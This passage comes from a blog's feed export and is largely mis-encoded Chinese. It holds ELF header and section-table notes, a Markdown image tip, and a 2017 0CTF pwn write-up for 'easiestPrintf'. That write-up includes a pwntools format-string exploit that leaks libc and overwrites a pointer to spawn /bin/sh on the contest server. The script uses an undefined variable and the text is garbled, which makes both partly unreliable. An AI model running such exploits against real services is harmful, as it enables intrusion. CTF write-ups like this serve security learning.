æ–‡ä»¶å¤´ä¸­ï¼Œæœ‰ELF é­”æ•°ï¼ˆMagicï¼‰ã€æ–‡ä»¶æœºå™¨å­—èŠ‚é•¿åº¦ï¼Œæ•°æ®å­˜å‚¨æ–¹å¼ï¼Œç‰ˆæœ¬ï¼Œè¿è¡Œå¹³å°ï¼ŒABIç‰ˆæœ¬,ELFé‡å®šä½ç±»å‹ï¼Œç­‰ç­‰ç­‰ï¼Œä¸­æ–‡å¾ˆæ˜æ˜¾éƒ½èƒ½çœ‹å‡ºæ¥äº†ã€‚</p><p>ELF æ–‡ä»¶å¤´ ç›¸å…³å¸¸æ•°å®šä¹‰åœ¨â€œ/usr/include/elf.hâ€,ELF æ–‡ä»¶æœ‰32ç‰ˆæœ¬ å’Œ64ä½ç‰ˆæœ¬ï¼Œæ–‡ä»¶å¤´å†…å®¹ä¸€æ ·ï¼Œæœ‰äº›æˆå‘˜ä¸ä¸€æ ·ã€‚ä¸¤è€…æ–‡ä»¶åˆ†åˆ«å«â€Elf_32Ehdrâ€å’Œâ€œElf64_Ehdrâ€.</p><p>ä¹¦ä¸Šï¼Œä»¥ 32ä½çš„ç‰ˆæœ¬çš„æ–‡ä»¶å¤´ç»“æ„â€Elf32_Ehdrâ€ä½œä¸ºä¾‹å­æ¥æè¿°ã€‚å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EI_NIDENT</span></span><br><span class="line">    <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> e_ident[EI_NIDENT];</span><br><span class="line">    Elf32_Half e_type;</span><br><span class="line">    Elf32_Half e_machine;</span><br><span class="line">    Elf32_Word e_version;</span><br><span class="line">    Elf32_Addr e_entry;</span><br><span class="line">    Elf32_Off e_phoff;</span><br><span class="line">    Elf32_Off e_shoff;</span><br><span class="line">    Elf32_Word e_flags;</span><br><span class="line">    Elf32_Half e_ehsize;</span><br><span class="line">    Elf32_Half e_phentsize;</span><br><span class="line">    Elf32_Half e_phnum;</span><br><span class="line">    Elf32_Half e_shentsize;</span><br><span class="line">    Elf32_Half e_shnum;</span><br><span class="line">    Elf32_Half e_shstrndx;</span><br><span class="line">    &#125;Elf32_Ehdr;</span><br></pre></td></tr></table></figure><p>å‘ç°ï¼Œæ–‡ä»¶å¤´ç»“æ„ä¸ä¹‹å‰<code>readefl -h</code> è¾“å‡ºçš„æ–‡ä»¶å¤´çš„ç»“æ„å¯ä»¥è¯´æ˜¯ä¸€ä¸€å¯¹åº”çš„ã€‚</p><p>ä¹¦ä¸­å°¤å…¶æåˆ°äº†çš„æ˜¯ï¼ŒElf32_Ehdrä¸­çš„e_identçš„è¿™ä¸ªæˆå‘˜å¯¹åº”äº†ç»“æœçš„â€œclassâ€ï¼Œâ€œDataâ€ï¼Œâ€œVersionâ€ã€â€œOS/ABIâ€å’Œâ€API Versionâ€5ä¸ªå‚æ•°ã€‚</p><p>åœ¨æ–‡ç« ä¸­çš„æ–‡ä»¶å¤´ç»“æ„æˆå‘˜å«ä¹‰ä¸­ï¼Œä½œè€…ç‰¹åˆ«å•ç‹¬ä»‹ç»äº†é­”æ•°ï¼Œ<br><strong>ELF é­”æ•°</strong><br>Magic çš„16ä¸ªå­—èŠ‚ï¼Œå¯¹åº”çš„Elf_Ehdrçš„è¿™ä¸ªæˆå‘˜ã€‚è¿™16ä¸ªå­—èŠ‚è¢«ELFæ ‡å‡†è§„å®šç”¨æ¥æ ‡è¯†ELFæ–‡ä»¶çš„å¹³å°å±æ€§ã€‚</p><p><code> Magicï¼š   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00</code></p><p>æœ€å¼€å§‹çš„4ä¸ªå­—èŠ‚ï¼Œ0x7f 0x45 0x4c 0x46 ç¬¬ä¸€ä¸ªå­—èŠ‚å¯¹åº”ASCIIå­—ç¬¦é‡Œçš„DELæ§åˆ¶ç¬¦ï¼Œå3ä¸ªå¯¹åº”ELF 3ä¸ªå­—æ¯çš„ASCIIç ã€‚æ‰€ä»¥è¿™å››ä¸ªå­—èŠ‚åˆç§°ä¸ºELFæ–‡ä»¶çš„é­”æ•°ã€‚</p><hr><p>å¾ˆå¤šç±»å‹çš„æ–‡ä»¶ï¼Œå…¶èµ·å§‹çš„å‡ ä¸ªå­—èŠ‚çš„å†…å®¹æ˜¯å›ºå®šçš„ï¼ˆæˆ–æ˜¯æœ‰æ„å¡«å……ï¼Œæˆ–æ˜¯æœ¬å°±å¦‚æ­¤ï¼‰ã€‚æ ¹æ®è¿™å‡ ä¸ªå­—èŠ‚çš„å†…å®¹å°±å¯ä»¥ç¡®å®šæ–‡ä»¶ç±»å‹ï¼Œå› æ­¤è¿™å‡ ä¸ªå­—èŠ‚çš„å†…å®¹è¢«ç§°ä¸ºé­”æ•° (magic number)ã€‚æ­¤å¤–åœ¨ä¸€äº›ç¨‹åºä»£ç ä¸­ï¼Œç¨‹åºå‘˜å¸¸å¸¸å°†åœ¨ä»£ç ä¸­å‡ºç°ä½†æ²¡æœ‰è§£é‡Šçš„æ•°å­—å¸¸é‡æˆ–å­—ç¬¦ä¸²ç§°ä¸ºé­”æ•° (magic number)æˆ–é­”å­—ç¬¦ä¸²ã€‚</p><hr><p>ç´§æ¥ç€ç¬¬ä¸€ä¸ªå­—èŠ‚ç”¨æ¥æ ‡è¯†ELF æ–‡ä»¶ç±»çš„ï¼Œ0x01è¡¨ç¤º32ä½ï¼Œ0x02è¡¨ç¤º64ä½çš„ï¼Œç¬¬6ä¸ªå­—èŠ‚æ˜¯å­—èŠ‚åºã€‚è§„å®šELFæ–‡ä»¶æ˜¯å¤§ç«¯è¿˜æ˜¯å°ç«¯</p><hr><p>å¤§ç«¯æ¨¡å¼ï¼Œæ˜¯æŒ‡æ•°æ®çš„é«˜å­—èŠ‚ä¿å­˜åœ¨å†…å­˜çš„ä½åœ°å€ä¸­ï¼Œè€Œæ•°æ®çš„ä½å­—èŠ‚ä¿å­˜åœ¨å†…å­˜çš„é«˜åœ°å€ä¸­ï¼Œè¿™æ ·çš„å­˜å‚¨æ¨¡å¼æœ‰ç‚¹å„¿ç±»ä¼¼äºæŠŠæ•°æ®å½“ä½œå­—ç¬¦ä¸²é¡ºåºå¤„ç†ï¼šåœ°å€ç”±å°å‘å¤§å¢åŠ ï¼Œè€Œæ•°æ®ä»é«˜ä½å¾€ä½ä½æ”¾ï¼›è¿™å’Œæˆ‘ä»¬çš„é˜…è¯»ä¹ æƒ¯ä¸€è‡´ã€‚<br>å°ç«¯æ¨¡å¼ï¼Œæ˜¯æŒ‡æ•°æ®çš„é«˜å­—èŠ‚ä¿å­˜åœ¨å†…å­˜çš„é«˜åœ°å€ä¸­ï¼Œè€Œæ•°æ®çš„ä½å­—èŠ‚ä¿å­˜åœ¨å†…å­˜çš„ä½åœ°å€ä¸­ï¼Œè¿™ç§å­˜å‚¨æ¨¡å¼å°†åœ°å€çš„é«˜ä½å’Œæ•°æ®ä½æƒæœ‰æ•ˆåœ°ç»“åˆèµ·æ¥ï¼Œé«˜åœ°å€éƒ¨åˆ†æƒå€¼é«˜ï¼Œä½åœ°å€éƒ¨åˆ†æƒå€¼ä½ã€‚</p><hr><p>ç¬¬7ä¸ªå­—èŠ‚è§„å®šELFæ–‡ä»¶çš„ä¸»ç‰ˆæœ¬å·ï¼Œä¸€èˆ¬æ˜¯1ï¼ˆELF æ ‡å‡†ç›®å‰æ›´æ–°åˆ°1.2ï¼‰ï¼Œåé¢çš„9ä¸ªå­—èŠ‚ä¸€èˆ¬ä¸º0.</p><h4 id="æ®µè¡¨"><a href="#æ®µè¡¨" class="headerlink" title="æ®µè¡¨"></a>æ®µè¡¨</h4><p>æ®µè¡¨(Section Header Table)ï¼Œä¿å­˜ELFæ–‡ä»¶æ®µçš„åŸºæœ¬å±æ€§ã€‚æè¿°ELFæ–‡ä»¶å„ä¸ªæ®µçš„ä¿¡æ¯ï¼šæ®µåã€æ®µçš„é•¿åº¦ã€åœ¨æ–‡ä»¶ä¸­çš„åç§»ã€è¯»å†™æƒé™ä»¥åŠæ®µçš„å…¶ä»–å±æ€§ã€‚ELFæ–‡ä»¶çš„æ®µç»“æ„ç”±æ®µè¡¨å†³å®šï¼Œæ®µè¡¨ç”±ELFæ–‡ä»¶å¤´çš„â€œe_shoffâ€ æˆå‘˜å†³å®šã€‚</p><hr><p>æˆ‘ä»¬å¯ä»¥ç”¨<code>objdump -h</code>æ¥æŸ¥çœ‹ ELF åŒ…å«çš„æ®µï¼Œä½†æ˜¯è¿™ä¸ªå‘½ä»¤çŸ¥è¯†æ˜¾ç¤ºå…³é”®æ®µ</p><hr><p>ä¹¦ä¸­ï¼Œå‘Šè¯‰æˆ‘ä»¬<code>readefl</code>å·¥å…·èƒ½å®Œæ•´çš„æ˜¾ç¤ºæ®µè¡¨ç»“æ„â€œâ€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">wings@sw:~&#x2F;æ¡Œé¢&#x2F;0ctf&#x2F;Print$ readelf -S EasiestPrintf</span><br><span class="line">å…±æœ‰ 29 ä¸ªèŠ‚å¤´ï¼Œä»åç§»é‡ 0x19bc å¼€å§‹ï¼š</span><br><span class="line">èŠ‚å¤´ï¼š</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1</span><br><span class="line">  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4</span><br><span class="line">  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4</span><br><span class="line">  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 0000ac 04   A  5   0  4</span><br><span class="line">  [ 5] .dynsym           DYNSYM          08048258 000258 000140 10   A  6   1  4</span><br><span class="line">  [ 6] .dynstr           STRTAB          08048398 000398 0000ca 00   A  0   0  1</span><br><span class="line">  [ 7] .gnu.version      VERSYM          08048462 000462 000028 02   A  5   0  2</span><br><span class="line">  [ 8] .gnu.version_r    VERNEED         0804848c 00048c 000040 00   A  6   1  4</span><br><span class="line">  [ 9] .rel.dyn          REL             080484cc 0004cc 000090 08   A  5   0  4</span><br><span class="line">  [10] .init             PROGBITS        0804855c 00055c 000023 00  AX  0   0  4</span><br><span class="line">  [11] .plt              PROGBITS        08048580 000580 000010 04  AX  0   0 16</span><br><span class="line">  [12] .plt.got          PROGBITS        08048590 000590 000078 00  AX  0   0  8</span><br><span class="line">  [13] .text             PROGBITS        08048610 000610 000392 00  AX  0   0 16</span><br><span class="line">  [14] .fini             PROGBITS        080489a4 0009a4 000014 00  AX  0   0  4</span><br><span class="line">  [15] .rodata           PROGBITS        080489b8 0009b8 000044 00   A  0   0  4</span><br><span class="line">  [16] .eh_frame_hdr     PROGBITS        080489fc 0009fc 00003c 00   A  0   0  4</span><br><span class="line">  [17] .eh_frame         PROGBITS        08048a38 000a38 000108 00   A  0   0  4</span><br><span class="line">  [18] .init_array       INIT_ARRAY      08049ecc 000ecc 000004 00  WA  0   0  4</span><br><span class="line">  [19] .fini_array       FINI_ARRAY      08049ed0 000ed0 000004 00  WA  0   0  4</span><br><span class="line">  [20] .jcr              PROGBITS        08049ed4 000ed4 000004 00  WA  0   0  4</span><br><span class="line">  [21] .dynamic          DYNAMIC         08049ed8 000ed8 0000e0 08  WA  6   0  4</span><br><span class="line">  [22] .got              PROGBITS        08049fb8 000fb8 000048 04  WA  0   0  4</span><br><span class="line">  [23] .data             PROGBITS        0804a000 001000 000008 00  WA  0   0  4</span><br><span class="line">  [24] .bss              NOBITS          0804a020 001008 00002c 00  WA  0   0 32</span><br><span class="line">  [25] .comment          PROGBITS        00000000 001008 000034 01  MS  0   0  1</span><br><span class="line">  [26] .shstrtab         STRTAB          00000000 0018bc 0000fd 00      0   0  1</span><br><span class="line">  [27] .symtab           SYMTAB          00000000 00103c 000540 10     28  47  4</span><br><span class="line">  [28] .strtab           STRTAB          00000000 00157c 000340 00      0   0  1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings)</span><br><span class="line">  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)</span><br><span class="line">  O (extra OS processing required) o (OS specific), p (processor specific)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æˆ‘çš„è¿™ä¸ªæ–‡ä»¶æœ‰29ä¸ªæ®µï¼ŒTypeæè¿°äº†æ®µçš„ç±»å‹ã€‚ä¹¦ä¸­å‘Šè¯‰æˆ‘ä»¬ï¼Œæ®µè¡¨æ˜¯ä»¥â€œElf32_Shdrâ€ç»“æ„ä½“ä¸ºå…ƒç´ çš„æ•°ç»„ã€‚<br>#####ã€€æ®µçš„ç±»å‹ï¼ˆsh_typeï¼‰<br>æ®µçš„ç±»å‹å¸¸é‡ï¼Œä»¥<code>SHT_</code>å¼€å¤´ã€‚</p><h5 id="æ®µçš„æ ‡å¿—ä½"><a href="#æ®µçš„æ ‡å¿—ä½" class="headerlink" title="æ®µçš„æ ‡å¿—ä½"></a>æ®µçš„æ ‡å¿—ä½</h5><p>æ®µçš„æ ‡å¿—ä½è¡¨ç¤ºæ®µåœ¨è¿›ç¨‹è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­çš„å±æ€§ï¼Œæ¯”å¦‚æ˜¯å¦å¯å†™ï¼Œæ˜¯å¦å¯æ‰§è¡Œç­‰ã€‚ç›¸å…³å¸¸é‡ä»¥<code>SHF_</code>å¼€å¤´</p><h5 id="æ®µçš„é“¾æ¥ä¿¡æ¯-sh-link-ã€sh-info"><a href="#æ®µçš„é“¾æ¥ä¿¡æ¯-sh-link-ã€sh-info" class="headerlink" title="æ®µçš„é“¾æ¥ä¿¡æ¯(sh_link ã€sh_info)"></a>æ®µçš„é“¾æ¥ä¿¡æ¯(sh_link ã€sh_info)</h5><p>æ®µçš„ç±»å‹ä¸é“¾æ¥ç›¸å…³ï¼Œå¦‚é‡å®šä½è¡¨ï¼Œç¬¦å·è¡¨ï¼Œè¿™ä¸¤ä¸ªæˆå‘˜å°±æœ‰æ„ä¹‰ã€‚</p><h4 id="é‡å®šä½è¡¨"><a href="#é‡å®šä½è¡¨" class="headerlink" title="é‡å®šä½è¡¨"></a>é‡å®šä½è¡¨</h4></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ELF </tag>
            
            <tag> ç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…» </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2017å¹´ 0CTF---éƒ¨åˆ†Pwn writeup</title>
      <link href="2017-0CTF-Pwn.html"/>
      <url>2017-0CTF-Pwn.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h4 id="easiestPrintf"><a href="#easiestPrintf" class="headerlink" title="easiestPrintf"></a>easiestPrintf</h4><p>è¿™ä¸ªé¢˜ç›®è®©æˆ‘æƒ³èµ·äº† ä¹‹å‰åšè¿‡çš„ <a href="http://bestwing.me/2016/12/30/one-gadget-rce/">oneshoot</a>ã€‚<br>å…ˆè¯´ä¸‹é¢˜ç›®ä¿æŠ¤æ˜¯å…¨å¼€çš„ã€‚ç„¶åæˆ‘ä»¬å¼€å§‹åˆ†æä¸‹ç¨‹åºã€‚<br><a href="http://i2.muimg.com/567571/df0a2c2d9c76df32.png" class="gallery-item"><img src="http://i2.muimg.com/567571/df0a2c2d9c76df32.png"></a></p><p>printf åé¢ç›´æ¥è·Ÿäº†exitï¼Œç”±äºä¿æŠ¤å…¨å¼€ï¼Œæˆ‘ä»¬ä¸èƒ½å»ä¿®æ”¹  è¿”å›åœ°å€æˆ–è€…exitçš„gotè¡¨ã€‚</p><p>åœ¨libcæˆ‘ä»¬ä»”ç»†çœ‹æ¥printfå‡½æ•°ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">printf</span><span class="params">(<span class="keyword">int</span> a1, ...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  va_list va; <span class="comment">// [sp+24h] [bp+8h]@1</span></span><br><span class="line"></span><br><span class="line">  va_start(va, a1);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">vfprintf</span>((<span class="keyword">int</span>)<span class="built_in">stdout</span>, a1, (<span class="keyword">int</span>)va);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šå›¾æ˜¯ä¸€ä¸ªä»»æ„åœ°å€æ³„æ¼ã€‚<br><a href="http://i1.piimg.com/567571/5a6f350e07eb6d9d.png" class="gallery-item"><img src="http://i1.piimg.com/567571/5a6f350e07eb6d9d.png"></a><br>è¿™é‡Œæœ‰ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„æ¼æ´â€“æ ¼å¼åŒ–ä¸²æ¼æ´</p><figure class="highlight as"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">08048811</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">08048811</span></span><br><span class="line">.text:<span class="number">08048811</span> loc_8048811:                            ; CODE XREF: leave+<span class="number">89</span>j</span><br><span class="line">.text:<span class="number">08048811</span>                 nop</span><br><span class="line">.text:<span class="number">08048812</span></span><br><span class="line">.text:<span class="number">08048812</span> loc_8048812:                            ; CODE XREF: leave+<span class="number">9</span>Ej</span><br><span class="line">.text:<span class="number">08048812</span>                 sub     esp, <span class="number">0</span>Ch</span><br><span class="line">.text:<span class="number">08048815</span>                 lea     eax, [ebp+s]</span><br><span class="line">.text:<span class="number">0804881</span>B                 push    eax             ; format</span><br><span class="line">.text:<span class="number">0804881</span>C                 call    printf</span><br><span class="line">.text:<span class="number">08048821</span>                 add     esp, <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">08048824</span>                 sub     esp, <span class="number">0</span>Ch</span><br><span class="line">.text:<span class="number">08048827</span>                 push    <span class="number">0</span>               ; status</span><br><span class="line">.text:<span class="number">08048829</span>                 call    _exit</span><br><span class="line">.text:<span class="number">08048829</span> leave           endp</span><br><span class="line">.text:<span class="number">08048829</span></span><br></pre></td></tr></table></figure><p>ä»”ç»†è§‚å¯Ÿï¼Œæˆ‘ä»¬å‘ç°printfï¼Œå®è´¨ä¸Šæ˜¯è°ƒç”¨äº†<code>vfprintf((int)stdout, a1, (int)va)</code>,<br><a href="http://i2.muimg.com/567571/3b86753cbe700314.png" class="gallery-item"><img src="http://i2.muimg.com/567571/3b86753cbe700314.png"></a><br>å¦‚æœ dword_1AC768å’Œfunc_hook + 4 * char_size) è¿™ä¸¤ä¸ªä½ç½®çš„å­˜å‚¨çš„æ•°æ®ä¸º0ï¼Œé‚£ä¹ˆä¼šè¿›å…¥åˆ°æ­£å¸¸çš„æµç¨‹ï¼Œé‚£ä¹ˆæˆ‘å°±å¯ä»¥ä»libcä¸­æ§åˆ¶æµç¨‹ã€‚</p><p>ä¹‹ååšçš„æ—¶å€™ï¼Œå‘ç°åˆ«äººç‰¹åˆ«å¥½çš„ä¸€ä¸ªæ–¹æ³•ï¼Œé‚£å°±æ˜¯</p><hr><p>ä¸éœ€è¦è‡ªå·±%xè¿™æ ·æ¥è®¡ç®—æµ‹è¯•åç§»å€¼ï¼Œç›´æ¥ç”¨pwntoolsä¸­çš„fmtstr_payloadæ¥ç”Ÿæˆ</p><hr><p><a href="http://i4.buimg.com/567571/21e45ef15617a1cb.png" class="gallery-item"><img src="http://i4.buimg.com/567571/21e45ef15617a1cb.png"></a></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2.7</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6_0ed9bad239c74870ed2db31c735132ce&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line">io = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">10002</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io = remote(<span class="string">&quot;202.120.7.210&quot;</span>,<span class="number">12321</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Which address you wanna read:\n&quot;</span>)</span><br><span class="line">io.sendline(str(<span class="number">0x804A044</span>))  <span class="comment"># .bss:0804A044 stdout@@GLIBC_2_0 dd</span></span><br><span class="line">stdout_addr = hex(io.recvline().rstrip())</span><br><span class="line">libcbase = stdout_addr - libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">system = libc.symbols[<span class="string">&#x27;system&#x27;</span>] + libcbase</span><br><span class="line">log.info(<span class="string">&#x27;stdout addr :%#x&#x27;</span> % stdout_addr)</span><br><span class="line">log.info(<span class="string">&#x27;libcbase : %#x&#x27;</span> %libcbase)</span><br><span class="line">log.info(<span class="string">&#x27;system addr: %#x&#x27;</span> %system)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Good Bye\n&quot;</span>)</span><br><span class="line">write = &#123;d + <span class="number">148</span>: <span class="number">0x0804A570</span> - <span class="number">0x1c</span>, <span class="number">0x0804A570</span>: system + <span class="number">1</span>&#125; <span class="comment">#:0004A570 __printf_fp     endp</span></span><br><span class="line">payload = <span class="string">&#x27;/bin/sh;&#x27;</span></span><br><span class="line">payload += fmtstr_payload(<span class="number">9</span>, write, len(payload), <span class="string">&#x27;byte&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&#x27;len: %d&#x27;</span> % len(payload))</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 0CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdownä¸­å¯¹å›¾ç‰‡è¿›è¡Œå±…ä¸­,è®¾ç½®å¤§å°ç­‰æ“ä½œ</title>
      <link href="markdown%E5%9B%BE%E7%89%87%E8%AE%BE%E7%BD%AE%E6%96%B9%E6%B3%95.html"/>
      <url>markdown%E5%9B%BE%E7%89%87%E8%AE%BE%E7%BD%AE%E6%96%B9%E6%B3%95.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="è®¾ç½®å›¾ç‰‡å±…ä¸­"><a href="#è®¾ç½®å›¾ç‰‡å±…ä¸­" class="headerlink" title="è®¾ç½®å›¾ç‰‡å±…ä¸­"></a>è®¾ç½®å›¾ç‰‡å±…ä¸­</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;div align&#x3D;center&gt;</span><br><span class="line">![]()</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><h1 id="è®¾ç½®å›¾ç‰‡å¤§å°"><a href="#è®¾ç½®å›¾ç‰‡å¤§å°" class="headerlink" title="è®¾ç½®å›¾ç‰‡å¤§å°"></a>è®¾ç½®å›¾ç‰‡å¤§å°</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;&#x2F;Users&#x2F;soindy&#x2F;Desktop&#x2F;app-components-short-look_2x.png&quot; width&#x3D;&quot;100&quot; height&#x3D;&quot;100&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure><p>å¦‚æœä½¿ç”¨ä¸ƒç‰›çš„å›¾åºŠ.æ¯”å¦‚è¯´æŒ‰æ¯”ä¾‹ç¼©å°50%:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url + ?imageMogr2&#x2F;thumbnail&#x2F;!50p</span><br></pre></td></tr></table></figure><p><a href="http://developer.qiniu.com/docs/v6/api/reference/fop/image/imagemogr2.html">ä¸ƒç‰›API</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> Markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŸºç¡€æ ˆæº¢å‡ºå¤ä¹  å›› ä¹‹ BROP</title>
      <link href="stack-overflow-four-BROP.html"/>
      <url>stack-overflow-four-BROP.html</url>
      
